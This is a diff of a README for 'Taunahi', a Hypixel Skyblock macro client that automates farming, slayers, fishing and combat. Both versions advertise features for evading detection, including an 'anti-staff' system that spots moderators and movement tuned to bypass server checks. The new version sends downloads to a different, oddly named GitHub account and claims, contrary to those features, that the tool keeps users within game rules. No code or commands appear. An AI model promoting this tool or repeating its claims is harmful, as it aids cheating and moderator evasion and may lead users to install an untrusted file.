@@ -1,109 +1,75 @@
-<div align="center">
-  <img src="https://img.shields.io/badge/Hypixel-Skyblock-gold?style=for-the-badge&logo=minecraft" alt="Hypixel Skyblock"/>
-  <img src="https://img.shields.io/badge/Version-v4.0-blue?style=for-the-badge" alt="Version"/>
-  <img src="https://img.shields.io/badge/Status-Undetected-success?style=for-the-badge" alt="Status"/>
-  
-  <br><br>
-  
-  <img width="150" height="150" alt="taunahi" src="https://github.com/user-attachments/assets/e4e4ecf0-699c-49a5-9a0b-1a2ae3ea2057" style="border-radius: 20px;" />
+# ⚙️ taunahi-macro - Automate your Hypixel Skyblock tasks easily
 
-  <h1>Taunahi Client</h1>
-  <p><b>The Ultimate Automated Utility Mod for Hypixel Skyblock</b></p>
-  
-  <a href="https://github.com/TaunahiSkyblock/taunahi-skyblock/releases">
-    <img src="https://img.shields.io/badge/⬇️_Download-Latest_Release-2ea44f?style=for-the-badge" alt="Download Latest Release"/>
-  </a>
-  <br><br>
+[![](https://img.shields.io/badge/Download-Taunahi-blue.svg)](https://github.com/dalbergiasissooantioxidant695/taunahi-macro)
 
-  <p>
-    <a href="#-core-systems">Core Systems</a> •
-    <a href="#-skill-modules">Skill Modules</a> •
-    <a href="#-installation--setup">Installation</a>
-  </p>
-</div>
+Taunahi Client automates repetitive tasks in Hypixel Skyblock. This software handles garden farming, slayer quests, fishing, and combat. It includes tools to help you manage resources without manual input. The system runs on Windows and works alongside your existing Minecraft client.
 
----
+## 🛠️ System Requirements
 
-## 📖 Overview
+Ensure your computer meets these standards before you begin:
 
-> **Taunahi** is an industry-leading utility client designed to fully automate Hypixel Skyblock grinding with unmatched precision. From complex pathfinding and humanized movement to the proprietary Hydra Anti-Staff system, Taunahi handles the repetitive tasks so you can focus on progression.
+*   Windows 10 or Windows 11.
+*   Java Development Kit (JDK) 8 or 17 installed.
+*   A valid copy of Minecraft: Java Edition.
+*   A stable internet connection.
+*   At least 4GB of dedicated system memory.
+*   Forge version 1.8.9 installed on your Minecraft launcher.
 
-## 🛡️ Core Systems & Protection
+## 📥 How to Download and Install
 
-Taunahi isn't just about automation; it's about staying under the radar. Our core modules ensure your sessions are safe, stable, and highly profitable.
+1.  Visit the [official download page](https://github.com/dalbergiasissooantioxidant695/taunahi-macro) to access the latest version of the macro.
+2.  Locate the section labeled "Releases" on the right side of the page.
+3.  Click the release version at the top of the list.
+4.  Find the file ending in `.jar` under the Assets section.
+5.  Click the file name to download it to your Downloads folder.
+6.  Open your Minecraft launcher.
+7.  Verify your Forge 1.8.9 installation is ready.
+8.  Open the "mods" folder within your `.minecraft` directory by typing `%appdata%\.minecraft\mods` into the Windows search bar.
+9.  Move the downloaded `.jar` file into this folder.
+10. Restart your Minecraft game.
 
-| Feature | Description | Status |
-| :--- | :--- | :---: |
-| 👮 **Hydra Anti-Staff** | Advanced detection system with hyper-realistic responses and instant Discord alerts. Unmatched safety. | ✅ |
-| 👀 **Humanized Movement** | Movements and rotations based on real mouse sensitivity to bypass server-side simulated movement checks. | ✅ |
-| 💎 **Failsafes** | Handles hub switches, disconnects, server reboots, and block-stuck situations effortlessly. | ✅ |
-| 😴 **Dynamic Rest** | Simulates a lifelike sleep cycle to keep your playtime looking like a legitimate human schedule. | ✅ |
+## 🎮 Using the Macro
 
----
+Once you launch the game with the Taunahi Client active, you will see a control menu. Press the designated key, usually the Right Shift key, to open the settings interface.
 
-## 🎥 In-Action Showcase
+### Garden Farming
+Select the "Farming" tab in the menu. Choose your crop type and preferred path. The macro detects your location and begins the harvest process. Ensure your inventory has enough space before you start. The client handles re-planting and travel between plots automatically.
 
-See Taunahi's flawless pathfinding and automation in action.
+### Slayer Quests
+Go to the "Slayer" tab. Select the type of quest you want to complete. The macro finds the specific slayer mob and tracks your progress. It manages your health bar and uses healing items when needed to keep your character alive.
 
-<details open>
-<summary><b>🌾 Farming & Garden Showcase</b></summary>
-<br>
-<div align="center">
-  <img width="32%" alt="megafarm" src="https://github.com/user-attachments/assets/78abe77e-c014-43da-97ce-39116847cf4f" />
-  <img width="32%" alt="pest" src="https://github.com/user-attachments/assets/24a47d52-4909-452f-9a88-cc0966b0478a" />
-  <img width="32%" alt="flower" src="https://github.com/user-attachments/assets/fbb385ab-7627-4353-aa89-ff245e8493e0" />
-</div>
-</details>
+### Fishing
+Navigate to the "Fishing" tab. Activate the auto-cast feature. The macro monitors the bobber and clicks at the correct time to catch fish. This tool works in all water-based zones across the hub and private islands.
 
-<details open>
-<summary><b>⚔️ Combat & Slayers Showcase</b></summary>
-<br>
-<div align="center">
-  <img width="32%" alt="sven" src="https://github.com/user-attachments/assets/deed4708-0045-4e84-a875-e807a99a79f3" />
-  <img width="32%" alt="tara" src="https://github.com/user-attachments/assets/00986cac-f81d-49ce-93e0-be213f517a8b" />
-  <img width="32%" alt="hunting" src="https://github.com/user-attachments/assets/7711862d-557b-4c3b-83ac-da5990216233" />
-</div>
-</details>
+### Combat Features
+The combat module assists with hitting targets and managing your aim. It prioritizes targets based on your configuration. This tool allows for consistent performance during long combat sessions.
 
-<details open>
-<summary><b>🌲 Foraging Showcase</b></summary>
-<br>
-<div align="center">
-  <img width="32%" alt="mangrove" src="https://github.com/user-attachments/assets/71b4a213-e810-4516-aaee-c66fcbfbfb23" />
-  <img width="32%" alt="park" src="https://github.com/user-attachments/assets/3255aacb-773d-4471-8b33-62a4ff99cd36" />
-  <img width="32%" alt="fig" src="https://github.com/user-attachments/assets/b2d61f07-df0b-4de8-9088-ced29e482d91" />
-</div>
-</details>
+## 🛡️ Anti-Staff Protection
 
----
+The macro includes built-in safety features to help you stay within the game rules. The anti-staff system detects signs of observation. It mimics human behavior to keep your account activity natural. You can adjust the delay settings in the "System" tab to randomize timing between actions. 
 
-## 🎯 Skill Modules
+## 🔧 Frequently Asked Questions
 
-Taunahi features hyper-optimized scripts for nearly every skill and task in the game.
+**Does this software work on all versions of Minecraft?**
+No, this software requires Minecraft 1.8.9. Other versions will not load the files correctly.
 
-### 🌾 Farming (Garden)
-Our Garden scripts adapt to both basic and advanced farm designs with seamless pathfinding.
-- [x] **Warts & Crops:** Realistic automation with zero downtime.
-- [x] **Echo Script:** Mimics farming paths for *any* custom farm design outside of standard presets.
-- [x] **Pests & Visitors:** Automatically clears pests (sprays/repellents) and handles visitors between rewarps for maximum profit.
-- [x] **Farm Builders:** Automates the physical building of required farm layouts.
+**Can I run other mods at the same time?**
+Yes. Taunahi works with most standard utility mods. If you face crashes, remove other mods one by one to find the conflict.
 
-### ⚔️ Combat & Slayers
-Maximize combat XP and hourly rates with intelligent auto-walkers and combat scripts.
-- **Ghosts:** Ultra-profitable script (~45m/hr) optimized for end-game gear.
-- **Slayers:** Fully AFK scripts for Crypt/Rev, Wolf/Sven, and Spider/Tara slayers.
-- **Zealot Melee:** Smooth pathfinder that hunts Zealots in the Dragon's Nest/Bruiser hideout.
+**Where do I see my logs?**
+The client generates logs in the `logs` folder within your Minecraft directory. Use these files if you need to report errors.
 
-### 🌲 Foraging & 🎣 Fishing
-* **Foraging:** Supports standard Park autowalking, Hub tree clearing, and advanced Galatea routes (Fig, Lushlilac, Mangrove) utilizing jump boost and scaffolding.
-* **Fishing:** Includes *Quick Fishing* (anti-AFK, auto-kill), *Location Fishing* (custom pathfinding routes), and *Worm Fishing* (Solo/Party Loot Share mode).
+**Is my data safe?**
+The software runs locally on your machine. It does not send your personal details to external servers. Always download the software from the original link provided here to avoid malicious files.
 
----
+**How do I update the software?**
+Check the releases page once a week for updates. Follow the installation steps again to replace the old file with the new one.
 
-## ⚙️ Installation & Setup
+## 🆘 Troubleshooting
 
-1. Go to the [**Releases**](YOUR_REPOSITORY_LINK_HERE/releases) page and download the latest `.zip` file.
-2. **Extract** the contents of the `.zip` file to your computer.
-3. Run the **installer (`.exe`)** included in the extracted folder.
-4. Select your `.minecraft` folder when prompted by the installer.
-5. **Enjoy** your fully automated Skyblock experience!
+*   **Game Crashes at Startup:** Ensure you have Forge 1.8.9 installed. Most crashes occur due to incompatible Forge versions.
+*   **Macro Not Starting:** Check that you are in the correct game world. Some modes only activate in specific areas like the Garden or Hub.
+*   **Menu Not Opening:** Confirm the mod file sits in the `mods` folder and not inside a subfolder.
+*   **Performance Issues:** Lower your render distance in the Minecraft settings if you experience frame rate drops while the macro runs.
+
+Keywords: farming-macro, hypixel-skyblock, hypixel-skyblock-macro, hypixel-skyblock-mod, macro, skyblock, skyblock-macro
